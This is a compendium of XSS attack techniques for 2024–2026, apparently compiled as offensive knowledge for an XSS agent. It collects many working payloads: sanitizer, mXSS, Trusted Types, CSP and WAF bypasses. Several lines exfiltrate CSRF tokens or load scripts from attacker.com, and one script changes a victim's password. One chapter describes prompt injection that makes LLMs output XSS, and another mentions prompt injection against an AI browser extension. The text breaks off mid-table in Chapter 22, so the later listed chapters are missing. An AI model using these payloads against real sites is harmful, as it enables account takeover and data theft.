# Advanced XSS Attack Techniques: Comprehensive Gap Analysis & Research (2024-2026)

> A comprehensive security research compendium covering cutting-edge XSS attack vectors, DOMPurify bypasses, browser sanitizer exploits, framework-specific vulnerabilities, and advanced escalation techniques as of October 2026.

---

## Table of Contents

- [Part I: Gap Analysis of Existing Research Corpora](#part-i-gap-analysis)
- [Part II: Advanced Attack Techniques](#part-ii-advanced-attack-techniques)
  - [Chapter 1: DOMPurify Bypasses 2024-2026](#chapter-1-dompurify-bypasses-2024-2026)
  - [Chapter 2: mXSS and Parser Differentials](#chapter-2-mxss-and-parser-differentials)
  - [Chapter 3: Browser Sanitizer API Bypasses](#chapter-3-browser-sanitizer-api-bypasses)
  - [Chapter 4: Trusted Types Bypass Techniques](#chapter-4-trusted-types-bypass-techniques)
  - [Chapter 5: Modern Framework SSR XSS](#chapter-5-modern-framework-ssr-xss)
  - [Chapter 6: CSP Bypass Techniques 2024-2026](#chapter-6-csp-bypass-techniques-2024-2026)
  - [Chapter 7: CSS-Only Data Exfiltration](#chapter-7-css-only-data-exfiltration)
  - [Chapter 8: Electron XSS-to-RCE Escalation](#chapter-8-electron-xss-to-rce-escalation)
  - [Chapter 9: Tauri v2 XSS-to-RCE](#chapter-9-tauri-v2-xss-to-rce)
  - [Chapter 10: Capacitor/Cordova Plugin Bridge Exploitation](#chapter-10-capacitorcordova-plugin-bridge-exploitation)
  - [Chapter 11: postMessage Exploitation Chains](#chapter-11-postmessage-exploitation-chains)
  - [Chapter 12: Prototype Pollution to XSS](#chapter-12-prototype-pollution-to-xss)
  - [Chapter 13: DOM Clobbering Attacks](#chapter-13-dom-clobbering-attacks)
  - [Chapter 14: Service Worker Persistence via XSS](#chapter-14-service-worker-persistence-via-xss)
  - [Chapter 15: Shadow DOM and Declarative Shadow DOM Exploitation](#chapter-15-shadow-dom-exploitation)
  - [Chapter 16: Import Maps Poisoning](#chapter-16-import-maps-poisoning)
  - [Chapter 17: AI/LLM Output XSS](#chapter-17-aillm-output-xss)
  - [Chapter 18: WebSocket and SSE XSS Vectors](#chapter-18-websocket-and-sse-xss)
  - [Chapter 19: File Upload XSS Beyond SVG](#chapter-19-file-upload-xss-beyond-svg)
  - [Chapter 20: WAF Bypass Techniques 2025-2026](#chapter-20-waf-bypass-techniques)
  - [Chapter 21: Browser Extension Exploitation via XSS](#chapter-21-browser-extension-exploitation)
  - [Chapter 22: XSS Chaining and Post-Exploitation](#chapter-22-xss-chaining-and-post-exploitation)
  - [Chapter 23: Advanced Detection and Fuzzing](#chapter-23-advanced-detection-and-fuzzing)
  - [Chapter 24: Exotic Vectors - GraphQL, Email, Markdown, OAuth](#chapter-24-exotic-vectors)
  - [Chapter 25: Emerging Attack Surfaces](#chapter-25-emerging-attack-surfaces)
- [Part III: Research Methodology and Tooling Recommendations](#part-iii-methodology)

---

## Part I: Gap Analysis

### Corpus 1: DOMPurify Agent Chunks (23 files)

**Covered well:** Basic DOMPurify configuration, standard mutation XSS patterns, common bypass techniques through 2023, general sanitizer concepts.

**Critical gaps identified:**
1. Missing CVEs from 2025-2026 (CVE-2025-15599, CVE-2025-26791, CVE-2026-0540, CVE-2026-41238, CVE-2026-47423, CVE-2026-49978, CVE-2026-66010)
2. No coverage of the Browser Sanitizer API (setHTML/getHTML) or its bypasses (CVE-2026-7939)
3. Missing the Chrome 138 HTML spec serialization change (attribute escaping)
4. No analysis of the `selectedcontent` element bypass
5. Missing declarative partial updates attack surface (Chrome 150)
6. No coverage of Trusted Types reaching Baseline browser support
7. Missing DOMPurify configuration pitfalls (CUSTOM_ELEMENT_HANDLING prototype pollution)

### Corpus 2: RXSS Agent Chunks (21 files)

**Covered well:** Reflected XSS fundamentals, basic encoding bypasses, common injection contexts, traditional filter evasion.

**Critical gaps identified:**
1. No modern framework SSR XSS vectors (Next.js, Remix, SvelteKit, Qwik, Astro)
2. Missing postMessage exploitation chains (CVE-2024-49038 Teams zero-click)
3. No CSS-only data exfiltration techniques (`:has()` pseudo-class advancement)
4. Missing prototype pollution to XSS chains (GHunter: 133 zero-day gadgets)
5. No coverage of AI/LLM prompt injection to XSS pipeline
6. Missing WebAssembly-based evasion analysis
7. No Service Worker persistence techniques
8. Missing browser extension exploitation via XSS
9. No XSS-to-RCE escalation for Electron/Tauri/Capacitor

### Corpus 3: XSS Agent Knowledge Base (44 chapters, 40 payloads)

**Covered well:** Comprehensive payload collections, Nuclei templates, Python tooling, general XSS taxonomy.

**Critical gaps identified:**
1. No coverage of DOMPurify CVEs past 2023
2. Missing mXSS parser differential analysis between browser engines
3. No GraphQL/gRPC/tRPC response rendering XSS
4. Missing email client XSS (AMP for Email attacks)
5. No markdown parser XSS research (Showdown CVE-2026-59710, CVE-2026-104477)
6. Missing OAuth/OIDC flow XSS vectors
7. No Chrome DevTools Protocol exploitation
8. Missing View Transitions API and Speculation Rules API analysis
9. No WebRTC SDP injection or ICE candidate manipulation research
10. Missing custom URL scheme / deep link XSS for mobile

---

## Part II: Advanced Attack Techniques

---

## Chapter 1: DOMPurify Bypasses 2024-2026

DOMPurify has experienced an accelerating rate of security-relevant bypasses, with root causes spanning nesting-based mXSS, prototype pollution, namespace confusion, template/shadow DOM traversal gaps, and configuration precedence errors.

### CVE-2024-45801: Nesting-Based mXSS

**Root cause:** Special nesting bypassed DOMPurify's depth check, producing a different DOM tree after serialize-reparse.

**Affected versions:** DOMPurify < 2.5.4 and < 3.1.3

**References:** [SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2024-45801/), [DOMPurify Wiki](https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History)

### CVE-2024-47875: Form/Math/MText/Table/MGlyph/Style Chain

**Root cause:** Flattening, foreign-content repair, and serialization instability combined to produce executable markup after reparse.

**Payload:**
```html
<form><math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

**Affected versions:** DOMPurify < 3.1.5

**Reporter:** @icesfont

### CVE-2025-15599: Textarea Rawtext Bypass in SAFE_FOR_XML

**Root cause:** The SAFE_FOR_XML regex omitted rawtext element names (e.g., textarea), allowing attribute values to escape context.

**Attack vector:** Rawtext element breakout via closing tag injection.

**Affected versions:** DOMPurify 3.x < 3.2.7 (2.x branch never patched)

**References:** [VulnCheck Advisory](https://www.vulncheck.com/advisories/dompurify-xss-via-textarea-rawtext-bypass-in-safe-for-xml)

### CVE-2025-26791: Template Reassembly Bypass

**Root cause:** Incorrect `${ ... }` handling during node removal. Removing elements and merging text nodes rebuilt a template expression.

**Payload:**
```html
<div id=app>{<foo></foo>{constructor.constructor("alert(1)")()}<foo></foo>}</div>
```

**Affected versions:** DOMPurify < 3.2.4

### CVE-2026-0540: SAFE_FOR_XML Attribute Regex Gap

**Root cause:** SAFE_FOR_XML attribute regex omitted rawtext element names, enabling mXSS via rawtext/RCDATA breakouts.

**Payload:**
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### CVE-2026-41238: Prototype Pollution to XSS via CUSTOM_ELEMENT_HANDLING

**Root cause:** An inherited `|| {}` fallback in the CUSTOM_ELEMENT_HANDLING code path allowed prototype pollution to override tag/attribute checks.

**Reproduction steps:**
1. Achieve prototype pollution anywhere in the application:
   ```javascript
   Object.prototype.tagNameCheck = /.*/;
   Object.prototype.attributeNameCheck = /.*/;
   ```
2. Inject HTML through DOMPurify:
   ```html
   <x-x autofocus tabindex=0 onfocus=alert(1)>
   ```
3. The custom element with event handler survives sanitization.

**Affected versions:** DOMPurify 3.0.1 through 3.3.3

**References:** [GHSA-v9jr-rg53-9pgp](https://github.com/advisories/GHSA-v9jr-rg53-9pgp)

### CVE-2026-47423: selectedcontent Element Bypass

**Root cause:** The browser (Chrome 130+) re-clones option content after the sanitizer's walk, reintroducing unsanitized nodes.

**Payload:**
```html
<select>
  <button><selectedcontent></selectedcontent></button>
  <option selected=javascript:1>
    <img src=x onerror=alert(1)>x
  </option>
</select>
```

**Affected versions:** DOMPurify 3.4.4 (fixed in 3.4.5)

### CVE-2026-49978: IN_PLACE Shadow Root Bypass

**Root cause:** Content inside a template's shadow root was skipped during IN_PLACE sanitization.

**Affected versions:** All DOMPurify < 3.4.7

### CVE-2026-66010: Hooks Skipped for Custom Elements

**Root cause:** Hooks skipped for some custom elements during afterSanitizeElements.

**Reporter:** @Rikuxx0. Fixed in 3.4.12.

### DOMPurify Configuration Pitfalls

The following configurations dramatically weaken sanitization:

| Configuration | Risk | Example Exploit |
|---|---|---|
| `ALLOW_UNKNOWN_PROTOCOLS` | Enables `javascript:`, `data:` URIs | `<a href="javascript:alert(1)">` |
| `ADD_TAGS: () => true` + `FORBID_TAGS: ['iframe']` | Function-form ADD_TAGS bypasses FORBID_TAGS | `<iframe src="https://evil.example">` |
| `CUSTOM_ELEMENT_HANDLING: {tagNameCheck: /.*/}` | All custom elements with event handlers pass | `<x-x onfocus=alert(1) autofocus>` |
| `RETURN_DOM` / `RETURN_DOM_FRAGMENT` | Enables serialize-reparse mXSS if later serialized | Namespace confusion payloads |
| `IN_PLACE` | Shadow roots, live event handlers bypass | CVE-2026-49978 |
| `SANITIZE_DOM: false` | Disables DOM clobbering protection | `<form><input name=nodeName>` |

---

## Chapter 2: mXSS and Parser Differentials

mXSS exploits the gap between how a sanitizer parses HTML and how the browser re-parses the serialized output.

### Core mXSS Attack Classes

**1. Namespace Confusion (SVG/MathML/HTML)**

In HTML, `<style>` is a raw-text element. In SVG namespace, `<style>` content IS parsed as elements.

```html
<svg><p><style><img src=x onerror=alert(1)></style></p></svg>
```

**2. MathML Integration Point Re-entry**

```html
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

**3. SVG foreignObject Re-entry**

```html
<svg><foreignObject><xmp><img src=x onerror=alert(1)></xmp></foreignObject></svg>
```

**4. Browser Nesting Depth Limits**

WebKit (bug 63082) and Firefox (bug 256180) cap DOM nesting depth. 512+ nested `<svg>` wrapping a payload can cause the browser to flatten them, making child elements become siblings and changing ancestry relationships.

**5. Foster Parenting**

```html
<table><script>alert(1)</script></table>
```
The script is foster-parented before the table in the DOM, but the sanitizer may inspect it as a table child.

### HTML Spec Serialization Change (May 2025)

The HTML specification was updated to escape `<` and `>` in attribute values during serialization. This directly eliminates the class of mXSS where unescaped angle brackets in attribute values create different parse trees on reparse.

- **Chrome 138** (June 24, 2025): Shipped
- **Firefox 140**: Shipped
- **Safari 26 beta**: Shipped

**What it fixes:** Attribute-value-based reparse mutations.

**What it does NOT fix:** Namespace confusion, depth-limit flattening, foster-parenting attacks.

### "Parse Me, Baby, One More Time" (2024)

David Klein et al. (TU Braunschweig) built MutaGen, a generator for hard-to-parse HTML fragments. They tested 11 sanitizers across five programming languages and automatically bypassed all but two.

**Presented at:** Black Hat Europe 2024

**References:** [CASA RUB Publication](https://casa.rub.de/forschung/publikationen/detail/parse-me-baby-one-more-time-bypassing-html-sanitizer-via-parsing-differentials)

### jsdom vs Browser Parser Divergence

Server-side sanitization via jsdom has fundamentally different behavior:
- `noscript` is parsed differently (jsdom always treats it as raw text; browsers depend on scripting context)
- Form element clobbering may not apply
- Depth limits differ

A payload safe in jsdom may be unsafe in a browser and vice versa.

---

## Chapter 3: Browser Sanitizer API Bypasses

The browser-native Sanitizer API (setHTML/getHTML) eliminates mXSS by design by operating in the same parser that will render content.

### Browser Support Status (2026)

| Browser | Version | Status |
|---|---|---|
| Chrome | 146+ | Available |
| Firefox | 148+ | Available |
| Safari | 26+ | Available |

### CVE-2026-7939: Chrome Sanitizer API UXSS

**Severity:** Medium (Google), CVSS 5.4 (CISA-ADP)

**Description:** Inappropriate implementation in SanitizerAPI in Chrome before 148.0.7778.96 allows injection of scripts or HTML via crafted HTML page.

**Fixed in:** Chrome 148.0.7778.96

### Two Chrome 146 Bypasses (Searchlight Cyber)

Security researchers at Searchlight Cyber reported two bypasses in Chrome's Sanitizer API implementation. The empty configuration (`new Sanitizer({})`) is the most permissive but should still block scripts.

### Mozilla srcdoc Design Decision

Mozilla chose to remove the context-free `sanitize()` function that accepts HTML strings. Rationale: a string-in/string-out sanitizer cannot know the insertion context. The API became `setHTML()` (element method) instead.

**References:** [Mozilla Bugzilla 1669945](https://bugzilla.mozilla.org/show_bug.cgi?id=1669945), [Frederik Braun](https://frederikbraun.de/why-sethtml.html)

---

## Chapter 4: Trusted Types Bypass Techniques

Trusted Types reached Baseline browser support in early 2026 (Firefox 148, joining Chrome 83+ and Safari 26+).

### Bypass 1: Attribute Node Manipulation (Masato Kinugawa)

Modifying existing attribute values via `nodeValue` or `textContent` on an attribute node bypasses Trusted Types enforcement entirely.

```javascript
// Get reference to an attribute node
let attr = element.getAttributeNode('href');
// Modify it directly - bypasses Trusted Types
attr.nodeValue = 'javascript:alert(1)';
```

**References:** [PortSwigger](https://portswigger.net/daily-swig/untrusted-types-researcher-demos-trick-to-beat-trusted-types-protection-in-google-chrome)

### Bypass 2: Cross-Origin Iframe Escape

CSP's `require-trusted-types-for 'script'` is not propagated to network-served cross-origin iframes. An attacker-controlled iframe can create its own trustedTypes policy.

### Bypass 3: Default Policy Abuse

```javascript
// Dangerously permissive default policy - effectively disables Trusted Types
trustedTypes.createPolicy('default', {
  createHTML: (s) => s,
  createScript: (s) => s,
  createScriptURL: (s) => s,
});
```

### Bypass 4: Polyfill Circumvention (Firefox)

An attacker who can define `window.trustedTypes` before the polyfill loads (via DOM clobbering with `<img name="trustedTypes">`) prevents enforcement entirely.

### Bypass 5: Script Gadgets in Frameworks

Script gadgets in JavaScript frameworks perform dangerous DOM operations from within trusted script contexts. Their operations bypass Trusted Types since the gadget runs in an already-trusted script.

### Real-World: MutantBedrog Campaign

The MutantBedrog malvertising campaign was observed working around Trusted Types CSP protections at every stage of execution.

**References:** [Confiant](https://blog.confiant.com/p/the-curious-case-of-mutantbedrogs)

---

## Chapter 5: Modern Framework SSR XSS

### Next.js / React Server Components

**React2Shell (CVE-2025-55182, CVSS 10.0):** Server-side prototype pollution in React Server Components packages. Exploitation via crafted multipart POST with `Next-Action` header. Confirmed against default `create-next-app` projects without authentication.

**Next.js tracking (CVE-2025-66478):** Affected Next.js 15.x, 16.x. Patched in multiple versions.

**Server Actions SSRF (CVE-2024-34351):** SSRF in Next.js Server Actions. Patched in Next.js 14.1.1.

### Remix / React Router

**CVE-2025-59057:** Meta-tag XSS. Untrusted input in route meta tags executes JavaScript.

**CVE-2026-22029:** Redirect XSS. Actions performing a redirect to user-input paths allow JavaScript execution.

### Svelte / SvelteKit

**Spread attribute XSS:** Event handler properties from untrusted data end up in SSR HTML when using spread attributes. Fixed in Svelte 5.51.5.

**CVE-2026-27901:** `bind:innerText` and `bind:textContent` values not escaped during SSR.

**CVE-2025-15265:** Client-side XSS in Svelte 5.46.0-5.46.3.

### Nuxt

**CVE-2024-34343:** `navigateTo` mishandled `javascript:` URLs.

**CVE-2026-45669:** Reflected XSS via server-side `navigateTo` with `external: true`. Fixed in Nuxt 3.21.6 and 4.4.6.

**CVE-2025-52662:** DevTools DOM-based XSS leading to RCE in development environments.

**CVE-2026-56317:** NoScript slot XSS.

### Qwik

**GHSA-m6jq-g7gq-5w3c:** SSR XSS via comment injection. Qwik serializes application state into HTML comments. Unescaped comment content allows breaking out with `-->` and injecting arbitrary HTML/JS. Fixed in qwik-city 1.19.0.

### Astro

**CVE-2026-59727:** `transition:persist`, `transition:scope`, and `transition:persist-props` directive values not HTML-escaped in SSR output. Affects Astro 3.10.0-7.0.3. Fixed in 7.0.4.

---

## Chapter 6: CSP Bypass Techniques 2024-2026

### Nonce Leakage via Browser Caching

When a page with a CSP nonce is cached (bfcache or disk cache), an attacker with HTML injection can recover the nonce from the cached response.

**Defense:** Avoid caching pages with nonces. Ensure nonces are truly single-use per-response.

### JSONP Endpoint Abuse on Whitelisted Domains

JSONP endpoints on trusted CDNs echo caller-supplied callback names. With HTML injection:

```html
<script src="https://trusted-cdn.com/jsonp?callback=alert(1)//"></script>
```

### base-uri Hijacking

Missing `base-uri` directive allows redirecting relative script loads:

```html
<base href="https://attacker.com/">
<!-- All relative script src now load from attacker.com -->
```

`base-uri` is NOT covered by the `default-src` fallback.

### strict-dynamic Bypass via Script Gadgets

Under `strict-dynamic`, dynamically created scripts inherit trust. If an attacker gets execution inside a nonce-trusted context:

```javascript
// Inside a gadget in a nonce-trusted script
let s = document.createElement('script');
s.textContent = 'alert(1)';
document.body.appendChild(s); // Runs without its own nonce
```

### AngularJS CSP Bypass

AngularJS in CSP-compatible mode bypasses via `$event` object and Chrome's `path` property:

```
{{$on.constructor('alert(1)')()}}
```

---

## Chapter 7: CSS-Only Data Exfiltration

### Attribute Selector Exfiltration

```css
input[name="csrf"][value^="a"] { background: url(https://attacker.com/exfil?char=a); }
input[name="csrf"][value^="b"] { background: url(https://attacker.com/exfil?char=b); }
/* One rule per character per position */
```

Extracts a full CSRF token in approximately 10 seconds.

### The :has() Pseudo-Class Advancement

`:has()` enables exfiltration from hidden inputs, which cannot load background-images themselves:

```css
form:has(input[name="csrf"][value^="a"]) {
  background: url(https://attacker.com/leak?prefix=a);
}
```

Supported in all major browsers since late 2023.

### @font-face unicode-range Probing

```css
@font-face { font-family: probe; src: url(https://attacker.com/leak?char=A); unicode-range: U+0041; }
@font-face { font-family: probe; src: url(https://attacker.com/leak?char=B); unicode-range: U+0042; }
.target { font-family: probe; }
```

Reveals which characters are present but not their order.

### Ligature-Based Text Exfiltration

Custom font ligatures detect multi-character sequences. Combined with scrollbar detection or container query breakpoints, detects which sequences are present in text nodes. Overcomes the unicode-range limitation.

### CVE-2026-13790: Chrome Side-Channel Leak

Side-channel leak in Chrome's scroll handling prior to version 150.0.7871.47 allowed leaking cross-origin data via crafted HTML page.

---

## Chapter 8: Electron XSS-to-RCE Escalation

### CVE-2026-40322: SiYuan Note-Taking App (CVSS 9.0)

Stored XSS escalating to code execution because windows use `nodeIntegration: true` and `contextIsolation: false`.

### CVE-2026-70601: contextBridge Promise Bypass (Electron 39-42)

Apps exposing Promise-returning functions via contextBridge are vulnerable to context isolation bypass.

**Fixed in:** Electron 39.8.9, 40.9.2, 41.2.2, 42.0.0-beta.5

### Exploitation Chain Pattern

1. Achieve XSS in the renderer process
2. If `contextIsolation` is disabled: Override preload objects directly
3. If `contextIsolation` is enabled: Look for Promise-returning contextBridge APIs (CVE-2026-70601)
4. Escalate via `shell.openExternal` to launch arbitrary executables
5. Alternative: Override `Array.prototype.indexOf` to bypass protocol allowlist checks, enabling `file://` links

### Key Electron Defaults (Secure Since v12)

| Setting | Default | Risk if Changed |
|---|---|---|
| `nodeIntegration` | `false` | Full Node.js API access from renderer |
| `contextIsolation` | `true` | Preload context accessible from web content |
| `sandbox` | `true` (v20+) | OS-level process isolation bypassed |

---

## Chapter 9: Tauri v2 XSS-to-RCE

### CVE-2026-95626: CSP Nonce Bypass (CVSS 8.3)

Tauri's CSP nonce hardening doesn't protect against scripts loaded from `data:` or `blob:` sources. Per CSP Level 3, these remain active even with a nonce.

**Affects:** Tauri >= 2.0.0

### CVE-2026-95624: Updater Plugin IPC Injection (CVSS 6.8)

The updater plugin's `check` IPC command accepts an `allowDowngrades` flag from frontend JavaScript. XSS can bypass anti-rollback checks.

**Affects:** tauri-plugin-updater 2.8.0-2.12.0

### GHSA-57fm-592m-34r7: iframe IPC Bypass

Remote-origin iframes could reach Tauri IPC endpoints without being allowlisted in v2 capabilities. macOS-specific.

### Third-Party Audit Finding

CrabNebula audit: "In the worst case it elevates XSS impact to CVSS 9.0-10.0 if RCE features are enabled and improperly configured."

---

## Chapter 10: Capacitor/Cordova Plugin Bridge Exploitation

### CVE-2026-103922: Capacitor Internal Proxy Abuse (CVSS 9.3-9.6)

The internal proxy endpoint can serve attacker-chosen URLs under the app's own trusted origin. Grants access to all registered native plugins, localStorage, and cookies.

**Critical detail:** The proxy handler remained available even when CapacitorHttp plugin was disabled.

**Affects:** Capacitor 6.0.0-6.2.1, 7.0.0-7.6.8, and several 8.x releases.

### Historical: Cordova BridgeSecret (CVE-2015-8320)

Predictable BridgeSecret values enabled bridge hijacking.

### Attack Chain

1. Find XSS in the Capacitor/Cordova WebView
2. Abuse the internal proxy (CVE-2026-103922) to serve attacker content under the app origin
3. Access all registered native plugins (camera, filesystem, geolocation, contacts)
4. Exfiltrate data or install persistence

---

## Chapter 11: postMessage Exploitation Chains

### CVE-2024-49038: Microsoft Teams Zero-Click XSS (CVSS 9.3)

**Attack chain:**
1. `isFullTrust: true` manifest allows communication with main Teams window
2. Overly broad `validDomains` list
3. Payload hosted under `*.microsoft.com` domain
4. Host window returns authentication token
5. XSS fires with no user interaction, works across tenants

### Origin Validation Bypass Techniques

**indexOf() bypass:**
```javascript
// Vulnerable check
if (event.origin.indexOf('example.com') !== -1) { ... }
// Bypassed by: evil-example.com, example.com.attacker.com
```

**Regex coercion bypass:**
```javascript
// Passing anything other than RegExp leads to implicit conversion
if (event.origin.match('example.com')) { ... }
// The . matches any character: exampleXcom.attacker.com
```

**Wildcard target origin:**
```javascript
// Sending sensitive data to any frame
window.postMessage(authToken, '*');
```

### Synchronous Gadget Race Attack

The attacker stalls the parent's event loop with a synchronous gadget to install a listener and capture secrets before the legitimate handler runs.

### Dangling Domain Hijacking

Abandoned domains still listed in a Teams manifest's `validDomains` can be re-registered and used to intercept/inject messages.

---

## Chapter 12: Prototype Pollution to XSS

### GHunter Framework (2024-2025)

Found 133 zero-day prototype pollution gadgets across one million websites. Turned 23 previously "no-impact" pollution bugs into end-to-end XSS exploits.

**References:** [arXiv](https://arxiv.org/pdf/2407.10812)

### Library-Specific Chains

**Vue.js (CVE-2024-6783):** XSS via prototype pollution allowing arbitrary JavaScript execution.

**vue-i18n (GHSA-9r9m-ffp6-9x4v):** XSS through locale message AST in development mode.

**DOMPurify (CVE-2024-48910, CVSS 9.3):** Improper property checks allow prototype pollution to bypass the sanitizer in versions below 2.4.2.

**Handlebars (GHSA-2qvq-rjwj-gvw9):** A polluted string value whose key matches a partial reference renders without HTML escaping. Affects 4.0.0-4.7.8.

### Common Gadget Patterns

- `innerHTML` sinks where polluted property controls HTML content
- `script.src` assignments via `__proto__.src`
- `document.write` calls concatenating polluted properties
- jQuery `$.extend` deep merge
- lodash `_.merge` / `_.set` / `_.setWith`

---

## Chapter 13: DOM Clobbering Attacks

### CVE-2024-43788: webpack AutoPublicPathRuntimeModule

DOM clobbering gadget in webpack's runtime code. Exploited in the wild against Canvas LMS.

**Affects:** webpack 5.0.0-beta.32 through 5.93.0. Fixed in 5.94.0.

### DOMPurify Clobbering Bypasses (2024)

**DOMPurify 3.1.0 bypass:** Clobbering `.parentNode` resets the depth count.

**DOMPurify 3.1.2 bypass:** Second-order clobbering of the `__depth` attribute.

**DOMPurify `cid:` protocol trick:** DOMPurify allows `cid:` protocol which doesn't URL-encode double-quotes, enabling attribute injection.

### Hulk Research: 497 Zero-Day Gadgets

Academic research found 497 zero-day DOM clobbering gadgets across the Tranco Top 5,000 websites.

---

## Chapter 14: Service Worker Persistence via XSS

### Attack Chain

1. Achieve XSS on the target origin
2. Upload or locate a JavaScript file on the same origin
3. Register it as a Service Worker:
   ```javascript
   navigator.serviceWorker.register('/uploads/evil-sw.js', {scope: '/'});
   ```
4. The worker activates and persists across page navigations and browser restarts
5. Intercept all fetch events to modify responses, inject content, exfiltrate data

### Cache Storage Poisoning Variant

No file upload needed. Use XSS to inject a script into the cached copy of `index.html` via the CacheStorage API. One transient XSS leads to code running in later sessions, even after the original bug is patched.

### Constraints

- Service worker scripts must be same-origin (no `data:` or cross-origin `blob:` URLs)
- `Service-Worker-Allowed` header needed for broader scope
- `Clear-Site-Data` header is the primary remediation, but the attacker's SW may intercept this response

---

## Chapter 15: Shadow DOM and Declarative Shadow DOM Exploitation

### Declarative Shadow DOM Sanitizer Bypass

**Payload:**
```html
<template shadowrootmode="closed">
  <slot onslotchange="alert(1)"></slot>
</template>
```

Sanitizers that don't understand `<template shadowrootmode>` pass the content through intact. The browser creates a shadow root with the XSS payload.

### Browser Mitigation

A specification change blocks declarative Shadow DOM from fragment parser entry points (innerHTML, DOMParser) unless explicitly opted in. The attack works only in full document parsing contexts.

### Shadow DOM is NOT a Security Boundary

- Open shadow roots: accessible via `element.shadowRoot`
- Closed shadow roots: accessible through saved references, browser devtools APIs, certain DOM traversal methods

### Web Component Lifecycle Sinks

Custom element callbacks (`connectedCallback`, `attributeChangedCallback`) that process untrusted data are XSS sinks equivalent to `innerHTML`.

---

## Chapter 16: Import Maps Poisoning

### Attack Model

The attacker injects a `<script type="importmap">` element before the application's own import map. Browsers accept only the first import map.

```html
<script type="importmap">
{
  "imports": {
    "react": "data:text/javascript,alert(1)//",
    "lodash": "https://attacker.com/malicious-lodash.js"
  }
}
</script>
```

All bare module specifiers (`import React from "react"`) resolve to attacker URLs, hijacking the entire dependency tree.

### Constraints

- Requires HTML injection high enough in the document to precede the legitimate import map
- CSP `script-src` should block `data:` and inline import maps if properly configured
- Many applications include `unsafe-inline` or nonces that may cover the injected map

---

## Chapter 17: AI/LLM Output XSS

### OWASP LLM05:2025: Improper Output Handling

LLM output rendered without sanitization enables XSS, CSRF, SSRF, and RCE.

### Attack Pipeline

1. **Direct prompt injection:** Attacker instructs the model to generate HTML/JavaScript
2. **Indirect prompt injection:** Poisoned data (emails, documents, web pages) processed by the LLM inject payloads into other users' sessions
3. **Base64 evasion (DeepSeek case):** Hide XSS payload in Base64, instruct model to decode and return only the result

### Highest Risk Scenarios

- Applications rendering LLM output as Markdown-to-HTML (Markdown supports inline HTML)
- SSE-streamed LLM responses rendered via `innerHTML`
- Chat interfaces that don't sanitize model responses

### Defense

- Strict CSP to limit XSS from LLM-generated content
- Treat all LLM output as untrusted input
- Sanitize before rendering, not after generation

---

## Chapter 18: WebSocket and SSE XSS

### CVE-2026-35515: NestJS SSE Injection

In `@nestjs/core`, `SseStream._transform()` interpolates `message.type` and `message.id` directly into SSE output without sanitizing `\r` or `\n`. Injected data leads to XSS if client renders SSE data as HTML.

**Affects:** All NestJS versions through 11.1.17. Fixed in 11.1.18.

### SSE CRLF Injection

SSE fields are delimited by CRLF. Unescaped carriage returns in data values inject extra fields:

```
data: legitimate data\r\nevent: malicious\r\ndata: <script>alert(1)</script>
```

### WebSocket Relay XSS

Most dangerous in chat applications and collaborative editors where user-generated content is broadcast. Analogous to stored XSS with WebSocket as the transport.

### CVE-2026-46431: CORS Misconfiguration in SSE

Hardcoded `Access-Control-Allow-Origin: *` allowed any third-party page to read live SSE streams via EventSource.

---

## Chapter 19: File Upload XSS Beyond SVG

### CVE-2024-4367: PDF.js Font Parsing XSS

Missing type check in PDF.js font handling allows arbitrary JavaScript execution. The font matrix (which should contain numbers) can be replaced with executable code.

**Affects:** PDF.js < 4.2.67, Firefox < 126

**Exploitation chain example:** Open redirect + PDF.js viewer URL validation weakness + CVE-2024-4367 = XSS on host platform.

### Office Open XML (DOCX/XLSX/PPTX)

XSS through rendering of embedded HTML content in XML parts. The `docem` tool can embed XSS payloads in DOCX, ODT, PPTX, and XLSX by modifying internal XML parts.

### Filename XSS (2024)

**IBEXA-SA-2024-004:** DOM-based XSS in file upload widget via filenames. Fixed in Ibexa DXP 3.3.39 and 4.6.9.

---

## Chapter 20: WAF Bypass Techniques

### Mixed-Case Event Handler Bypass (Cloudflare, 2025)

```html
<img src=x oNcLiCk=alert(1)>
```

WAF token matching was case-sensitive; browsers' HTML parsing is case-insensitive.

### Null Byte Injection (Cloudflare, 2025)

Malformed attributes with null bytes cause WAF parsing to terminate early while the browser continues processing.

### SVG Injection Bypass

```html
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>
```

WAF rules may not inspect SVG content as thoroughly as standard HTML.

### Double URL Encoding

```
%2527 → WAF sees %27 (harmless) → app decodes to ' (quote)
%253C → WAF sees %3C → app decodes to < (angle bracket)
```

### Overlong UTF-8 Encoding

Encoding characters with more bytes than necessary. Legacy or permissive decoders accept them while WAFs reject/ignore them.

### Encoding Chain Attacks

Combine URL encoding, HTML entity encoding, Unicode encoding, and JavaScript string encoding in sequence. The WAF inspects one layer; the application stack decodes multiple layers.

```
&#x6F;&#x6E;click → HTML parser decodes to onclick
```

---

## Chapter 21: Browser Extension Exploitation via XSS

### Claude Chrome Extension Zero-Click XSS (2026)

Abused via XSS and a weak allowlist to inject prompts from any site. Patched in version 1.0.41 with strict origin check.

### DeepL Chrome Extension (CVE-2026-40451)

XSS via un-neutralized user input before page generation. Multiple incomplete fixes before v1.24.0.

### Automa Extension (FP-2023-004)

Content script routed `automa:execute-block` messages to a handler running custom JavaScript. An attacker could inject JavaScript via this handler from a crafted page.

### Escalation Model

1. XSS on a web page targets the extension's content script
2. Content script communicates with background page via extension messaging API
3. Background page has access to extension-level APIs (storage, tabs, cookies, native messaging)
4. Extensions with `debugger` permission can use Chrome DevTools Protocol for full system access

---

## Chapter 22: XSS Chaining and Post-Exploitation

### XSS + CSRF Chain

Injected script reads CSRF tokens from the page (same-origin access), then sends authenticated state-changing requests:

```javascript
// Read CSRF token from the page
let token = document.querySelector('meta[name="csrf-token"]').content;
// Change victim's password
fetch('/api/change-password', {
  method: 'POST',
  headers: {'X-CSRF-Token': token, 'Content-Type': 'application/json'},
  body: JSON.stringify({password: 'attacker-controlled'})
});
```

### XSS + SSRF Chain

Injected script triggers requests to internal services from the victim's network position.

### Logging Pipeline to Account Takeover

1. JSON payload containing XSS written to admin-facing HTML log viewer
2. Serializer escapes angle brackets as Unicode sequences
3. Viewer decodes or renders with innerHTML
4. Script runs in admin's browser, exfiltrates tokens

### Service Worker Persistence + Post-Exploitation

XSS registers a malicious Service Worker that persists across sessions, creating a permanent browser-side backdoor for credential harvesting, session riding, and internal network scanning.

### Post-Exploitation Capabilities

| Technique | API Used | Impact |
|---|---|---|
